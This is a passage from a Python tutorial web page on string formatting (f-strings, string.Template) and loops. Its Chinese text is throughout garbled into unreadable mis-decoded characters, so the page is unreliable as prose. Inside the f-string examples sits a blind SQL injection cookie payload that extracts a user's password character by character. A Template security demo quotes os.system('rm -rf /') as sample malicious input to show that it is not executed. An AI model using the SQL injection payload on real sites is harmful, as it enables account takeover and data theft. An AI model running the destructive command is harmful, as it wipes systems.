class="subst">&#123;<span class="number">255</span>:o&#125;</span>, Bin: <span class="subst">&#123;<span class="number">255</span>:b&#125;</span>&quot;</span>) <span class="comment"># Hex: ff, int: 255, Oct: 377, Bin: 11111111</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¹é½ä¸å¡«å……ï¼ˆå­—ç¬¦ä¸²åæ¥&#x27;:&#x27;ï¼‰</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;<span class="string">&#x27;left&#x27;</span>:&lt;<span class="number">10</span>&#125;</span>]&quot;</span>)              <span class="comment"># [left      ]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;<span class="string">&#x27;right&#x27;</span>:&gt;<span class="number">10</span>&#125;</span>]&quot;</span>)             <span class="comment"># [     right]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;<span class="string">&#x27;center&#x27;</span>:^<span class="number">10</span>&#125;</span>]&quot;</span>)            <span class="comment"># [  center  ]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;<span class="string">&#x27;pad&#x27;</span>:*&gt;<span class="number">10</span>&#125;</span>]&quot;</span>)              <span class="comment"># [*******pad]</span></span><br><span class="line"><span class="comment"># æ„å»ºcookie SQLæ³¨å…¥å­—å…¸ï¼Œçˆ†ç ´æŸä¸€ç”¨æˆ·å¯†ç ï¼ˆéƒ¨åˆ†ï¼‰ï¼š</span></span><br><span class="line">cookies = &#123;<span class="string">&#x27;TrackingId&#x27;</span>: <span class="string">f&quot;<span class="subst">&#123;Tracking_id&#125;</span>&#x27; and ascii(substr((select password from <span class="subst">&#123;tablename&#125;</span> where username=&#x27;<span class="subst">&#123;username&#125;</span>&#x27;),<span class="subst">&#123;password_index&#125;</span>,1)) &gt; <span class="subst">&#123;ascii_mid&#125;</span>--+;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ—¥æœŸæ ¼å¼åŒ–</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">now = datetime.now()</span><br><span class="line"><span class="built_in">print</span>(now)                            <span class="comment"># 2025-07-16 14:16:57.921635</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Now: <span class="subst">&#123;now:%Y-%m-%d&#125;</span>&quot;</span>)         <span class="comment"># Now: 2025-07-16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŸå§‹å­—ç¬¦ä¸²ï¼ˆé¿å…è½¬ä¹‰ï¼‰</span></span><br><span class="line">name = <span class="string">&quot;Corazon&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">fr&quot;Raw: \n <span class="subst">&#123;name&#125;</span>&quot;</span>)             <span class="comment"># Raw: \n Corazon</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Raw: \\n <span class="subst">&#123;name&#125;</span>&quot;</span>)             <span class="comment"># Raw: \n Corazon</span></span><br></pre></td></tr></table></figure>
<hr>
<h4 id="æ¨¡æ¿å­—ç¬¦ä¸²ï¼ˆstring-Templateï¼‰"><strong>æ¨¡æ¿å­—ç¬¦ä¸²ï¼ˆ<code>string.Template</code>ï¼‰</strong></h4>
<p><code>string.Template</code> æ˜¯ Python æ ‡å‡†åº“ä¸­æä¾›çš„ä¸€ç§å®‰å…¨ã€ç®€å•çš„å­—ç¬¦ä¸²æ›¿æ¢æœºåˆ¶ï¼Œç‰¹åˆ«é€‚åˆå¤„ç†ç”¨æˆ·æä¾›çš„æ¨¡æ¿æˆ–éœ€è¦é˜²æ­¢æ³¨å…¥æ”»å‡»çš„åœºæ™¯ã€‚</p>
<p><strong>åŸºæœ¬ç”¨æ³•ï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line"><span class="comment">#01 åˆ›å»ºæ¨¡æ¿å¯¹è±¡</span></span><br><span class="line">t = Template(<span class="string">&quot;Hello, $name! Today is $day.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ substitute() æ–¹æ³•è¿›è¡Œå®‰å…¨æ›¿æ¢ï¼š</span></span><br><span class="line">result = t.substitute(name=<span class="string">&quot;Alice&quot;</span>, day=<span class="string">&quot;Monday&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)                   <span class="comment"># è¾“å‡º: Hello, Alice! Today is Monday.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ safe_substitute() æ–¹æ³•ï¼Œå½“ç¼ºå°‘å˜é‡æ—¶ä¸ä¼šæŠ¥é”™ï¼š</span></span><br><span class="line">result = t.safe_substitute(name=<span class="string">&quot;Bob&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)                   <span class="comment"># è¾“å‡º: Hello, Bob! Today is $day.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#02 å˜é‡è¡¨ç¤ºå½¢å¼</span></span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç®€å•å˜é‡ ($var)</span></span><br><span class="line">t = Template(<span class="string">&quot;Welcome, $user!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(t.substitute(user=<span class="string">&quot;Admin&quot;</span>))  <span class="comment"># Welcome, Admin!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŒ…è£¹å˜é‡ ($&#123;var&#125;)</span></span><br><span class="line"><span class="comment"># å½“å˜é‡ååéœ€è¦ç´§è·Ÿå­—æ¯ã€æ•°å­—æˆ–ä¸‹åˆ’çº¿æ—¶ä½¿ç”¨,é¿å…æ­§ä¹‰ï¼š</span></span><br><span class="line">t = Template(<span class="string">&quot;Total: $&#123;amount&#125;USD&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(t.substitute(amount=<span class="number">100</span>))    <span class="comment"># Total: 100USD</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#03 ä½¿ç”¨å­—å…¸è¿›è¡Œæ›¿æ¢</span></span><br><span class="line">data = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Corazon&quot;</span>, <span class="string">&quot;item&quot;</span>: <span class="string">&quot;book&quot;</span>, <span class="string">&quot;price&quot;</span>: <span class="number">29.99</span>&#125;</span><br><span class="line">t = Template(<span class="string">&quot;$name bought a $item for $$$price&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(t.substitute(data))  <span class="comment"># Corazon bought a book for $29.99</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#04 ç‰¹æ®Šå­—ç¬¦å¤„ç†</span></span><br><span class="line"><span class="comment"># è½¬ä¹‰ `$` ç¬¦å·ï¼Œä½¿ç”¨ä¸¤ä¸ª `$` è¡¨ç¤ºå­—é¢å€¼çš„ç¾å…ƒç¬¦å·ï¼š</span></span><br><span class="line">t = Template(<span class="string">&quot;Cost: $$ $amount&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(t.substitute(amount=<span class="number">50</span>))  <span class="comment"># Cost: $ 50</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤„ç†åŒ…å« `$` çš„å€¼</span></span><br><span class="line">t = Template(<span class="string">&quot;Value: $val&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(t.substitute(val=<span class="string">&quot;$100&quot;</span>))  <span class="comment"># Value: $100</span></span><br></pre></td></tr></table></figure>
<h5 id="é«˜çº§ç”¨æ³•">é«˜çº§ç”¨æ³•</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 2.è‡ªå®šä¹‰åˆ†éš”ç¬¦ï¼ˆç»§æ‰¿ Templateï¼‰</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyTemplate</span>(<span class="title class_ inherited__">Template</span>):</span><br><span class="line">    delimiter = <span class="string">&#x27;#&#x27;</span>  <span class="comment"># å°†åˆ†éš”ç¬¦æ”¹ä¸º #</span></span><br><span class="line">    idpattern = <span class="string">r&#x27;[a-z]+&#x27;</span>  <span class="comment"># åªå…è®¸å°å†™å­—æ¯å˜é‡å</span></span><br><span class="line">t = MyTemplate(<span class="string">&quot;Hello, #name! Your code is #code&quot;</span>)  </span><br><span class="line"><span class="built_in">print</span>(t.substitute(name=<span class="string">&quot;Corazon&quot;</span>, code=<span class="string">&quot;XYZ123&quot;</span>))  <span class="comment"># Hello, Corazon! Your code is XYZ123</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.å¤„ç†æ— æ•ˆæ ‡è¯†ç¬¦</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SafeTemplate</span>(<span class="title class_ inherited__">Template</span>):</span><br><span class="line">    idpattern = <span class="string">r&#x27;[_a-z][_a-z0-9]*&#x27;</span>  <span class="comment"># æ ‡å‡†æ ‡è¯†ç¬¦è§„åˆ™</span></span><br><span class="line">t = SafeTemplate(<span class="string">&quot;$user_name: $score&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(t.substitute(user_name=<span class="string">&quot;Eve&quot;</span>, score=<span class="number">95</span>))  <span class="comment"># Eve: 95</span></span><br></pre></td></tr></table></figure>
<h5 id="å®‰å…¨ç‰¹æ€§">å®‰å…¨ç‰¹æ€§</h5>
<p><code>string.Template</code> çš„ä¸»è¦å®‰å…¨ä¼˜åŠ¿ï¼š</p>
<ol>
<li class="lvl-3">
<p><strong>ä¸æ‰§è¡Œè¡¨è¾¾å¼</strong>ï¼šä¸ä¼šåƒ f-strings é‚£æ ·æ‰§è¡Œä»»æ„ä»£ç </p>
</li>
<li class="lvl-3">
<p><strong>æ— æ ¼å¼åŒ–åŠŸèƒ½</strong>ï¼šä¸èƒ½è®¿é—®å¯¹è±¡å±æ€§æˆ–æ‰§è¡Œæ–¹æ³•</p>
</li>
<li class="lvl-3">
<p><strong>ç®€å•æ›¿æ¢</strong>ï¼šåªè¿›è¡Œç›´æ¥çš„å­—ç¬¦ä¸²æ›¿æ¢</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å®‰å…¨ç¤ºä¾‹ - é˜²æ­¢æ³¨å…¥æ”»å‡»</span></span><br><span class="line">user_input = <span class="string">&quot;$&#123;os.system(&#x27;rm -rf /&#x27;)&#125;&quot;</span>  <span class="comment"># æ¶æ„è¾“å…¥</span></span><br><span class="line">t = Template(<span class="string">&quot;User data: $data&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(t.safe_substitute(data=user_input))  <span class="comment"># å®‰å…¨è¾“å‡º: User data: $&#123;os.system(&#x27;rm -rf /&#x27;)&#125;</span></span><br></pre></td></tr></table></figure>
<h5 id="å®é™…åº”ç”¨åœºæ™¯">å®é™…åº”ç”¨åœºæ™¯</h5>
<ol>
<li class="lvl-3">
<p>é‚®ä»¶æ¨¡æ¿</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">email_template = Template(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Dear $name,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your order #$order_id has been shipped.</span></span><br><span class="line"><span class="string">Tracking number: $tracking_num</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Regards,</span></span><br><span class="line"><span class="string">$company</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Alice&quot;</span>,</span><br><span class="line">    <span class="string">&quot;order_id&quot;</span>: <span class="string">&quot;12345&quot;</span>,</span><br><span class="line">    <span class="string">&quot;tracking_num&quot;</span>: <span class="string">&quot;ZYX987&quot;</span>,</span><br><span class="line">    <span class="string">&quot;company&quot;</span>: <span class="string">&quot;ACME Corp&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(email_template.substitute(data))</span><br></pre></td></tr></table></figure>
<p><strong>2. é…ç½®æ–‡ä»¶æ¨¡æ¿</strong></p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line">config_template = Template(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[DATABASE]</span></span><br><span class="line"><span class="string">host = <span class="variable">$db_host</span></span></span><br><span class="line"><span class="string">port = <span class="variable">$db_port</span></span></span><br><span class="line"><span class="string">user = <span class="variable">$db_user</span></span></span><br><span class="line"><span class="string">password = <span class="variable">$db_pass</span></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">db_config = &#123;</span><br><span class="line">    <span class="string">&quot;db_host&quot;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">    <span class="string">&quot;db_port&quot;</span>: <span class="number">5432</span>,</span><br><span class="line">    <span class="string">&quot;db_user&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;db_pass&quot;</span>: <span class="string">&quot;secure123&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(config_template.substitute(db_config))</span><br></pre></td></tr></table></figure>
<p><strong>3. å¤šè¯­è¨€æ”¯æŒ</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">templates = &#123;</span><br><span class="line">    <span class="string">&quot;en&quot;</span>: Template(<span class="string">&quot;Hello, <span class="variable">$name</span>!&quot;</span>),</span><br><span class="line">    <span class="string">&quot;es&quot;</span>: Template(<span class="string">&quot;Â¡Hola, <span class="variable">$name</span>!&quot;</span>),</span><br><span class="line">    <span class="string">&quot;fr&quot;</span>: Template(<span class="string">&quot;Bonjour, <span class="variable">$name</span>!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def greet(name, <span class="attribute">lang</span>=<span class="string">&quot;en&quot;</span>):</span><br><span class="line">    return templates[lang].substitute(<span class="attribute">name</span>=name)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(greet(<span class="string">&quot;Pierre&quot;</span>, <span class="string">&quot;fr&quot;</span>))  # Bonjour, Pierre!</span><br></pre></td></tr></table></figure>
<hr>
<h4 id="å…¶ä»–æ–¹æ³•"><strong>å…¶ä»–æ–¹æ³•</strong></h4>
<p><strong>(1) å­—ç¬¦ä¸²æ‹¼æ¥</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Name: &quot;</span> + name + <span class="string">&quot;, Age: &quot;</span> + <span class="built_in">str</span>(age))</span><br></pre></td></tr></table></figure>
<p><strong>(2) <code>str.join()</code> å¤„ç†åˆ—è¡¨</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">words = [<span class="string">&quot;Python&quot;</span>, <span class="string">&quot;is&quot;</span>, <span class="string">&quot;powerful&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot; &quot;</span>.join(words))  <span class="comment"># Python is powerful</span></span><br></pre></td></tr></table></figure>
<hr>
<h4 id="æ€»ç»“å¯¹æ¯”"><strong>æ€»ç»“å¯¹æ¯”</strong></h4>
<table>
<thead>
<tr>
<th><strong>æ–¹æ³•</strong></th>
<th><strong>æ˜“è¯»æ€§</strong></th>
<th><strong>çµæ´»æ€§</strong></th>
<th><strong>å®‰å…¨æ€§</strong></th>
<th><strong>ç‰ˆæœ¬è¦æ±‚</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>%</code> æ ¼å¼åŒ–</td>
<td>ä½</td>
<td>ä¸­</td>
<td>ä½</td>
<td>æ‰€æœ‰ç‰ˆæœ¬</td>
</tr>
<tr>
<td><code>str.format()</code></td>
<td>é«˜</td>
<td>é«˜</td>
<td>ä¸­</td>
<td>Python 2.6+</td>
</tr>
<tr>
<td><strong>f-strings</strong></td>
<td><strong>æé«˜</strong></td>
<td><strong>æé«˜</strong></td>
<td>ä¸­</td>
<td><strong>Python 3.6+</strong></td>
</tr>
<tr>
<td><code>string.Template</code></td>
<td>ä¸­</td>
<td>ä½</td>
<td><strong>é«˜</strong></td>
<td>æ‰€æœ‰ç‰ˆæœ¬</td>
</tr>
</tbody>
</table>
<h2 id="æµç¨‹æ§åˆ¶è¯­å¥"><strong>æµç¨‹æ§åˆ¶è¯­å¥</strong></h2>
<p><strong>pythonæµç¨‹æ§åˆ¶è¯­å¥ä»‹ç»</strong></p>
<p>è½¯ä»¶ç¨‹åºæ˜¯ç”±è¯­å¥æ„æˆï¼Œè€Œæµç¨‹æ§åˆ¶è¯­å¥æ˜¯ç”¨æ¥æ§åˆ¶ç¨‹åºä¸­æ¯æ¡è¯­å¥æ‰§è¡Œé¡ºåºçš„è¯­å¥ï¼›å¯ä»¥é€šè¿‡æ§åˆ¶è¯­å¥å®ç°æ›´ä¸°å¯Œçš„é€»è¾‘ä»¥åŠæ›´å¼ºå¤§çš„åŠŸèƒ½ï¼›å‡ ä¹æ‰€æœ‰ç¼–ç¨‹è¯­è¨€éƒ½æœ‰æµç¨‹æ§åˆ¶è¯­å¥ï¼ŒåŠŸèƒ½ä¹Ÿéƒ½åŸºæœ¬ç›¸ä¼¼ï¼Œå…¶æµç¨‹æ§åˆ¶æ–¹å¼æœ‰ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>é¡ºåºç»“æ„</p>
</li>
<li class="lvl-2">
<p>åˆ†æ”¯ç»“æ„</p>
</li>
<li class="lvl-2">
<p>å¾ªç¯ç»“æ„</p>
</li>
</ul>
<p>æœ€ç®€å•æœ€å¸¸ç”¨çš„å°±æ˜¯é¡ºåºç»“æ„ï¼Œå³è¯­å¥ä»ä¸Šè‡³ä¸‹é€ä¸€æ‰§è¡Œï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I am zkrc.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I like python.&quot;</span>) <span class="comment"># ä»ä¸Šåˆ°ä¸‹ä¾æ¬¡æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure>
<h3 id="æµç¨‹æ§åˆ¶åˆ†æ”¯è¯­å¥">æµç¨‹æ§åˆ¶åˆ†æ”¯è¯­å¥</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å•åˆ†æ”¯è¯­å¥è¯­æ³•ç»“æ„ï¼š</span></span><br><span class="line"><span class="keyword">if</span> è¡¨è¾¾å¼:</span><br><span class="line">    ä»£ç å— </span><br><span class="line"></span><br><span class="line"><span class="comment"># åŒåˆ†æ”¯è¯­å¥è¯­æ³•ç»“æ„ï¼š</span></span><br><span class="line"><span class="keyword">if</span> è¡¨è¾¾å¼:</span><br><span class="line">    ä»£ç å—<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ä»£ç å—<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if è¡¨è¾¾å¼1:</span></span><br><span class="line">    ä»£ç å—<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> è¡¨è¾¾å¼<span class="number">2</span>:</span><br><span class="line">    ä»£ç å—<span class="number">2</span></span><br><span class="line">...æ›´å¤š<span class="keyword">elif</span>è¯­å¥</span><br><span class="line"><span class="keyword">else</span>ï¼š</span><br><span class="line">    ä»£ç å— n</span><br></pre></td></tr></table></figure>
<p>åŒåˆ†æ”¯è¯­å¥ä¸­çš„passç”¨æ³•ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ç©ºè¯­å¥ï¼Œä¸åšä»»ä½•äº‹åŠ¡å¤„ç†ï¼Œä¸€èˆ¬ç”¨ä½œå ä½</p>
</li>
<li class="lvl-2">
<p>ä¿è¯æ ¼å¼å®Œæ•´</p>
</li>
<li class="lvl-2">
<p>ä¿è¯è¯­ä¹‰å®Œæ•´</p>
</li>
</ul>
<p><strong>ä¸€äº›é«˜é˜¶ç”¨æ³•ï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#01 æ‰“å°num1å’Œnum2ä¸­è¾ƒå¤§çš„æ•°</span></span><br><span class="line">num1, num2 = <span class="number">1</span>, <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(num1 <span class="keyword">if</span> num1 &gt; num2 <span class="keyword">else</span> num2)  <span class="comment"># 2</span></span><br></pre></td></tr></table></figure>
<h3 id="æµç¨‹æ§åˆ¶å¾ªç¯è¯­å¥"><strong>æµç¨‹æ§åˆ¶å¾ªç¯è¯­å¥</strong></h3>
<p>Pythonè¯­è¨€ä¸­çš„å¾ªç¯è¯­å¥æ”¯æŒ whileå¾ªç¯ï¼ˆæ¡ä»¶å¾ªç¯ï¼‰å’Œforå¾ªç¯ï¼ˆéå†å¾ªç¯ï¼‰</p>
<h4 id="æµç¨‹æ§åˆ¶å¾ªç¯è¯­å¥-while"><strong>æµç¨‹æ§åˆ¶å¾ªç¯è¯­å¥-while</strong></h4>
<p>å¾ªç¯è¯­å¥è¯­æ³•æ ¼å¼ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> è¡¨è¾¾å¼:</span><br><span class="line">    å¾ªç¯ä½“</span><br></pre></td></tr></table></figure>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        å¾ªç¯è¯­å¥åº”ç”¨ç¤ºä¾‹
    </div>
    <div class="spoiler-content">
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ— é™å¾ªç¯</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ— é™å¾ªç¯æ‰“å°,é—´éš”0.5ç§’ã€‚</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;boss&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># æœ‰é™å¾ªç¯ï¼šä»æ•°å­—1æ‰“å°è¾“å‡ºåˆ°10</span></span><br><span class="line">count = <span class="number">1</span>          </span><br><span class="line"><span class="keyword">while</span> count &lt;= <span class="number">10</span>: </span><br><span class="line">    <span class="built_in">print</span>(count)</span><br><span class="line">    count+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;end&quot;</span>)</span><br></pre></td></tr></table></figure>

    </div>
</div>
<h4 id="æµç¨‹æ§åˆ¶å¾ªç¯è¯­å¥-for"><strong>æµç¨‹æ§åˆ¶å¾ªç¯è¯­å¥-for</strong></h4>
<p>å¾ªç¯è¯­å¥è¯­æ³•æ ¼å¼ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> è¿­ä»£å˜é‡ <span class="keyword">in</span> å­—ç¬¦ä¸²|åˆ—è¡¨|å…ƒç»„|å­—å…¸|é›†åˆï¼š</span><br><span class="line">    ä»£ç å—</span><br></pre></td></tr></table></figure>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        å¾ªç¯è¯­å¥åº”ç”¨ç¤ºä¾‹
    </div>
    <div class="spoiler-content">
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;zkrc&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> [<span class="string">&quot;å¼ ä¸‰&quot;</span>,<span class="string">&#x27;æå››&#x27;</span>,<span class="string">&quot;ç‹äº”&quot;</span>]:</span><br><span class="line">    <span class="built_in">print</span>(item)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#  rangeå‡½æ•°ï¼š range(start,end,step)     </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):  <span class="comment"># range(5)ç»“æœä¸º[0,1,2,3,4]</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¶æ•°</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">11</span>,<span class="number">2</span>):</span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line">ç»“æœ:  å‰é—­åå¼€ ä¸åŒ…å«<span class="number">11</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure>

    </div>
</div>
<h4 id="æµç¨‹æ§åˆ¶å¾ªç¯åµŒå¥—"><strong>æµç¨‹æ§åˆ¶å¾ªç¯åµŒå¥—</strong></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#01 ç‹¬ç«‹åµŒå¥—</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):  <span class="comment">#5æ¬¡</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):  <span class="comment">#5æ¬¡</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  *&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#02 å…³è”åµŒå¥—</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):  <span class="comment">#æ§åˆ¶è¡Œæ•°</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):  <span class="comment">#æ§åˆ¶æ¯è¡Œä¸ªæ•°</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot; *&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>) </span><br></pre></td></tr></table></figure>
<h4 id="å¾ªç¯æ§åˆ¶è¯­å¥è¯´æ˜"><strong>å¾ªç¯æ§åˆ¶è¯­å¥è¯´æ˜</strong></h4>
<p>å¦‚æœåœ¨æŸä¸€æ—¶åˆ»ï¼ˆåœ¨ä¸æ»¡è¶³ç»“æŸæ¡ä»¶çš„æƒ…å†µä¸‹ï¼‰æƒ³æå‰ç»“æŸå¾ªç¯ï¼Œå¯ä»¥ä½¿ç”¨breakæˆ–continueå…³é”®å­—ï¼›</p>
<p><strong>å¾ªç¯æ§åˆ¶è¯­å¥-break</strong></p>
<p>å½“breakå…³é”®å­—ç”¨äºforå¾ªç¯æ—¶ï¼Œä¼šç»ˆæ­¢å¾ªç¯è€Œæ‰§è¡Œæ•´ä¸ªå¾ªç¯è¯­å¥åé¢çš„ä»£ç ä¿¡æ¯ï¼›break é€€å‡ºçš„æ˜¯å¾ªç¯ exit() æˆ–è€…quit() é€€å‡ºçš„æ˜¯è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;end&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>å¾ªç¯æ§åˆ¶è¯­å¥-continue</strong></p>
<p>ä¸åŒäºbreaké€€å‡ºæ•´ä¸ªå¾ªç¯ï¼ŒcontinueæŒ‡çš„é€€å‡ºå½“æ¬¡å¾ªç¯ï¼Œä½†ä¼šç»§ç»­åœ¨å¾ªç¯ç»“æ„ä¸­ï¼Œå®Œæˆåç»­çš„å¾ªç¯æ“ä½œï¼›</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;end&quot;</span>)</span><br></pre></td></tr></table></figure>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        æµç¨‹å¾ªç¯è¯­å¥ç»ƒä¹ 
    </div>
    <div class="spoiler-content">
        <p>å¾ªç¯æ§åˆ¶è¯­å¥ç»ƒä¹ -01ï¼šçŒœæ°´æœä»·æ ¼å°æ¸¸æˆ</p>
<p>ä¸€ä¸ªæ°´æœæ‘Šï¼Œè€æ¿å–æ°´æœï¼Œä½ å»çŒœæ°´æœä»·æ ¼ï¼Œå½“ä½ è¯´å‡ºä»·æ ¼åï¼Œè€æ¿ä¼šå‘Šè¯‰ä½ å¤§å°ï¼›</p>
<p>å¦‚æœçŒœé«˜äº†ï¼Œå°±ä¼šå‘Šè¯‰ä½ çŒœé«˜äº†ï¼›</p>
<p>å¦‚æœçŒœä½äº†ï¼Œå°±å‘Šè¯‰ä½ ä½ çŒœä½äº†ï¼›</p>
